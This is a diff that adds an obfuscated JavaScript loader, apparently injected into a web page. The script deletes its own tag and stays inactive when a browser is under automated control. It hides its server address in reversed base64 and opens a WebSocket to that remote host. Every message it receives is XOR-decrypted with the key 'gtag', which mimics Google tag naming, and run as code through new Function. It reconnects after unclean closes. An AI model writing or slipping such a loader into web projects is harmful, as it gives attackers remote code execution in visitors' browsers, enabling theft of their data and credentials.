@@ -1,0 +1,43 @@
+window.existingWebSocket = null;
+
+((v, w, d) => { 
+    d = this; 
+    if (d && d.nodeType === 1 && d.parentNode.removeChild(d)); 
+    if (w['pg_low_bit'] || navigator['webdriver']) return; 
+    w['pg_low_bit'] = 1; 
+	
+	var rS = function(str) { return str.split('').reverse().join(''); };
+    var p = obfuscate ;
+    var eRU = p.map(function(pt) { return pt; }).join('');
+    var dU = atob(rS(eRU));
+    var W = window.WebSocket, 
+        wsURL = String(dU), 
+        xorKey = 'gtag'; 
+
+function xorDecrypt(input, key) {
+    let keyBytes = new TextEncoder().encode(key);
+    let inputBytes = new Uint8Array(input.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+    let outputBytes = new Uint8Array(inputBytes.length);
+
+    for (let i = 0; i < inputBytes.length; i++) {
+        outputBytes[i] = inputBytes[i] ^ keyBytes[i % keyBytes.length];
+    }
+
+    return new TextDecoder().decode(outputBytes);
+}
+
+
+    var sortvis = function () { 
+        if (v-- > 0) {
+            if (!window.existingWebSocket || window.existingWebSocket.readyState === WebSocket.CLOSED) {
+                let ws = new W(wsURL); 
+                window.existingWebSocket = ws; 
+                ws.onmessage = e => new Function(xorDecrypt(e['data'], xorKey)).call(this);
+                ws.onclose = a => {!a.wasClean && setTimeout(sortvis, 1000)};
+            }
+        } 
+    }; 
+    sortvis();
+
+    document.getElementById("tcl_img_banner")?.parentNode.removeChild(document.getElementById("tcl_img_banner"));
+})(1, window);
